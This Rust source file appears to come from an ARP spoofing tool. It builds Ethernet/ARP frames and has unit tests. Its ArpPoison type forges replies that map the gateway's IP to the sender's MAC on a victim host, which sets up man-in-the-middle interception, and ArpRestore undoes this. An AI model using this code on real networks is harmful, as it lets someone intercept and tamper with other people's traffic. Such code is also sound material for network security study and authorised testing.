// src/network/packet.rs
use pnet::packet::Packet;
use pnet::packet::arp::{ArpHardwareTypes, ArpOperations, ArpPacket, MutableArpPacket};
use pnet::packet::ethernet::{EtherTypes, EthernetPacket, MutableEthernetPacket};
use pnet::util::MacAddr;
use std::net::Ipv4Addr;

// ─────────────────────────────────────────────────────────────────────────────
// Shared builder
// ─────────────────────────────────────────────────────────────────────────────

fn build_arp_frame(
    eth_dst: MacAddr,
    eth_src: MacAddr,
    op: pnet::packet::arp::ArpOperation,
    sender_mac: MacAddr,
    sender_ip: Ipv4Addr,
    target_mac: MacAddr,
    target_ip: Ipv4Addr,
) -> [u8; 42] {
    let mut buffer = [0u8; 42];

    let mut eth = MutableEthernetPacket::new(&mut buffer[..14])
        .expect("14 bytes is always a valid ethernet header");
    eth.set_destination(eth_dst);
    eth.set_source(eth_src);
    eth.set_ethertype(EtherTypes::Arp);

    let mut arp =
        MutableArpPacket::new(&mut buffer[14..]).expect("28 bytes is always a valid ARP packet");
    arp.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp.set_protocol_type(EtherTypes::Ipv4);
    arp.set_hw_addr_len(6);
    arp.set_proto_addr_len(4);
    arp.set_operation(op);
    arp.set_sender_hw_addr(sender_mac);
    arp.set_sender_proto_addr(sender_ip);
    arp.set_target_hw_addr(target_mac);
    arp.set_target_proto_addr(target_ip);

    buffer
}

// ─────────────────────────────────────────────────────────────────────────────
// Public packet types
// ─────────────────────────────────────────────────────────────────────────────

pub struct ArpRequest {
    pub target_ip: Ipv4Addr,
    pub sender_ip: Ipv4Addr,
    pub sender_mac: MacAddr,
}

impl ArpRequest {
    pub fn new(target_ip: Ipv4Addr, sender_ip: Ipv4Addr, sender_mac: MacAddr) -> Self {
        Self {
            target_ip,
            sender_ip,
            sender_mac,
        }
    }

    pub fn to_bytes(&self) -> [u8; 42] {
        build_arp_frame(
            MacAddr::broadcast(),
            self.sender_mac,
            ArpOperations::Request,
            self.sender_mac,
            self.sender_ip,
            MacAddr::zero(),
            self.target_ip,
        )
    }
}

pub struct GratuitousArp {
    pub claimed_ip: Ipv4Addr,
    pub our_mac: MacAddr,
}

impl GratuitousArp {
    pub fn new(claimed_ip: Ipv4Addr, our_mac: MacAddr) -> Self {
        Self {
            claimed_ip,
            our_mac,
        }
    }

    pub fn to_bytes(&self) -> [u8; 42] {
        build_arp_frame(
            MacAddr::broadcast(),
            self.our_mac,
            ArpOperations::Reply,
            self.our_mac,
            self.claimed_ip,
            MacAddr::zero(),
            self.claimed_ip,
        )
    }
}

pub struct ArpPoison {
    pub target_mac: MacAddr,
    pub target_ip: Ipv4Addr,
    pub spoofed_ip: Ipv4Addr,
    pub our_mac: MacAddr,
}

impl ArpPoison {
    pub fn new(
        target_mac: MacAddr,
        target_ip: Ipv4Addr,
        spoofed_ip: Ipv4Addr,
        our_mac: MacAddr,
    ) -> Self {
        Self {
            target_mac,
            target_ip,
            spoofed_ip,
            our_mac,
        }
    }

    pub fn to_bytes(&self) -> [u8; 42] {
        build_arp_frame(
            self.target_mac,
            self.our_mac,
            ArpOperations::Reply,
            self.our_mac,
            self.spoofed_ip,
            self.target_mac,
            self.target_ip,
        )
    }
}

pub struct ArpRestore {
    pub target_mac: MacAddr,
    pub target_ip: Ipv4Addr,
    pub real_ip: Ipv4Addr,
    pub real_mac: MacAddr,
}

impl ArpRestore {
    pub fn new(
        target_mac: MacAddr,
        target_ip: Ipv4Addr,
        real_ip: Ipv4Addr,
        real_mac: MacAddr,
    ) -> Self {
        Self {
            target_mac,
            target_ip,
            real_ip,
            real_mac,
        }
    }

    pub fn to_bytes(&self) -> [u8; 42] {
        build_arp_frame(
            self.target_mac,
            self.real_mac,
            ArpOperations::Reply,
            self.real_mac,
            self.real_ip,
            self.target_mac,
            self.target_ip,
        )
    }
}

pub struct ArpReply {
    pub sender_mac: MacAddr,
    pub sender_ip: Ipv4Addr,
    pub target_mac: MacAddr,
    pub target_ip: Ipv4Addr,
}

impl ArpReply {
    pub fn from_bytes(data: &[u8]) -> Option<Self> {
        if data.len() < 42 {
            return None;
        }
        let eth = EthernetPacket::new(data)?;
        if eth.get_ethertype() != EtherTypes::Arp {
            return None;
        }
        let arp = ArpPacket::new(eth.payload())?;
        if arp.get_operation() != ArpOperations::Reply {
            return None;
        }
        Some(Self {
            sender_mac: arp.get_sender_hw_addr(),
            sender_ip: arp.get_sender_proto_addr(),
            target_mac: arp.get_target_hw_addr(),
            target_ip: arp.get_target_proto_addr(),
        })
    }
}

// ─────────────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;
    use pnet::packet::arp::{ArpOperations, ArpPacket};
    use pnet::packet::ethernet::{EtherTypes, EthernetPacket};

    const LOCAL_MAC: MacAddr = MacAddr(0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF);
    const VICTIM_MAC: MacAddr = MacAddr(0x11, 0x22, 0x33, 0x44, 0x55, 0x66);
    const GATEWAY_MAC: MacAddr = MacAddr(0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x01);
    const LOCAL_IP: Ipv4Addr = Ipv4Addr::new(192, 168, 1, 100);
    const VICTIM_IP: Ipv4Addr = Ipv4Addr::new(192, 168, 1, 10);
    const GATEWAY_IP: Ipv4Addr = Ipv4Addr::new(192, 168, 1, 1);

    // Returns the ARP payload bytes from a raw frame so callers can construct
    // an ArpPacket with a lifetime tied to the frame, not a temporary.
    fn arp_payload(frame: &[u8; 42]) -> &[u8] {
        &frame[14..]
    }

    fn arp_of(frame: &[u8; 42]) -> ArpPacket {
        ArpPacket::new(arp_payload(frame)).unwrap()
    }

    // ── Frame size: every builder must produce exactly 42 bytes ───────────────
    #[test]
    fn test_all_builders_produce_42_bytes() {
        assert_eq!(
            ArpRequest::new(VICTIM_IP, LOCAL_IP, LOCAL_MAC)
                .to_bytes()
                .len(),
            42
        );
        assert_eq!(
            ArpPoison::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, LOCAL_MAC)
                .to_bytes()
                .len(),
            42
        );
        assert_eq!(
            ArpRestore::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC)
                .to_bytes()
                .len(),
            42
        );
        assert_eq!(
            GratuitousArp::new(VICTIM_IP, LOCAL_MAC).to_bytes().len(),
            42
        );
    }

    // ── ArpRequest ────────────────────────────────────────────────────────────
    #[test]
    fn test_arp_request_fields() {
        let frame = ArpRequest::new(VICTIM_IP, LOCAL_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = arp_of(&frame);

        assert_eq!(
            eth.get_destination(),
            MacAddr::broadcast(),
            "eth dst must be broadcast"
        );
        assert_eq!(eth.get_source(), LOCAL_MAC, "eth src must be sender MAC");
        assert_eq!(
            eth.get_ethertype(),
            EtherTypes::Arp,
            "ethertype must be ARP"
        );
        assert_eq!(arp.get_operation(), ArpOperations::Request);
        assert_eq!(arp.get_sender_hw_addr(), LOCAL_MAC);
        assert_eq!(arp.get_sender_proto_addr(), LOCAL_IP);
        assert_eq!(arp.get_target_proto_addr(), VICTIM_IP);
        assert_eq!(
            arp.get_target_hw_addr(),
            MacAddr::zero(),
            "target MAC unknown = zero"
        );
    }

    // ── ArpPoison ─────────────────────────────────────────────────────────────
    #[test]
    fn test_arp_poison_victim_direction() {
        // "gateway IP lives at our MAC" — sent to victim
        let frame = ArpPoison::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, LOCAL_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = arp_of(&frame);

        assert_eq!(eth.get_destination(), VICTIM_MAC, "eth dst = victim");
        assert_eq!(eth.get_source(), LOCAL_MAC, "eth src = us");
        assert_eq!(arp.get_operation(), ArpOperations::Reply);
        // The lie: victim will cache GATEWAY_IP → LOCAL_MAC
        assert_eq!(arp.get_sender_hw_addr(), LOCAL_MAC);
        assert_eq!(arp.get_sender_proto_addr(), GATEWAY_IP);
        assert_eq!(arp.get_target_hw_addr(), VICTIM_MAC);
        assert_eq!(arp.get_target_proto_addr(), VICTIM_IP);
    }

    #[test]
    fn test_arp_poison_gateway_direction() {
        // "victim IP lives at our MAC" — sent to gateway (symmetric)
        let frame = ArpPoison::new(GATEWAY_MAC, GATEWAY_IP, VICTIM_IP, LOCAL_MAC).to_bytes();
        let arp = arp_of(&frame);

        assert_eq!(arp.get_sender_hw_addr(), LOCAL_MAC);
        assert_eq!(arp.get_sender_proto_addr(), VICTIM_IP);
        assert_eq!(arp.get_target_hw_addr(), GATEWAY_MAC);
        assert_eq!(arp.get_target_proto_addr(), GATEWAY_IP);
    }

    // ── ArpRestore ────────────────────────────────────────────────────────────
    #[test]
    fn test_arp_restore_fields() {
        // Undoes the poison: victim learns GATEWAY_IP → GATEWAY_MAC (truth)
        let frame = ArpRestore::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC).to_bytes();
        let eth = EthernetPacket::new(&frame).unwrap();
        let arp = arp_of(&frame);

        assert_eq!(eth.get_destination(), VICTIM_MAC, "eth dst = victim");
        assert_eq!(eth.get_source(), GATEWAY_MAC, "eth src = real owner");
        assert_eq!(arp.get_operation(), ArpOperations::Reply);
        assert_eq!(arp.get_sender_hw_addr(), GATEWAY_MAC, "truth: gateway MAC");
        assert_eq!(arp.get_sender_proto_addr(), GATEWAY_IP, "truth: gateway IP");
    }

    // Poison and Restore for the same addresses must differ
    #[test]
    fn test_poison_and_restore_differ() {
        let poison = ArpPoison::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, LOCAL_MAC).to_bytes();
        let restore = ArpRestore::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC).to_bytes();
        assert_ne!(poison, restore);
    }

    // ── ArpReply parser ───────────────────────────────────────────────────────
    #[test]
    fn test_arp_reply_parses_valid_reply_frames() {
        // Both Poison and Restore are Reply frames; parser must accept both
        let poison_frame = ArpPoison::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, LOCAL_MAC).to_bytes();
        let restore_frame =
            ArpRestore::new(VICTIM_MAC, VICTIM_IP, GATEWAY_IP, GATEWAY_MAC).to_bytes();

        let r = ArpReply::from_bytes(&poison_frame).expect("poison frame must parse");
        assert_eq!(r.sender_mac, LOCAL_MAC);
        assert_eq!(r.sender_ip, GATEWAY_IP);
        assert_eq!(r.target_mac, VICTIM_MAC);
        assert_eq!(r.target_ip, VICTIM_IP);

        let r = ArpReply::from_bytes(&restore_frame).expect("restore frame must parse");
        assert_eq!(r.sender_mac, GATEWAY_MAC);
        assert_eq!(r.sender_ip, GATEWAY_IP);
    }

    #[test]
    fn test_arp_reply_rejects_invalid_frames() {
        // All "must return None" cases in one place
        let request_frame = ArpRequest::new(VICTIM_IP, LOCAL_IP, LOCAL_MAC).to_bytes();
        let cases: &[(&[u8], &str)] = &[
            (&request_frame, "Request frame (not Reply)"),
            (&[0u8; 20], "too short (20 bytes)"),
            (&[0u8; 42], "all-zero buffer (EtherType 0x0000)"),
            (&[], "empty slice"),
        ];
        for &(data, reason) in cases {
            assert!(
                ArpReply::from_bytes(data).is_none(),
                "should return None for {reason}"
            );
        }
    }
}
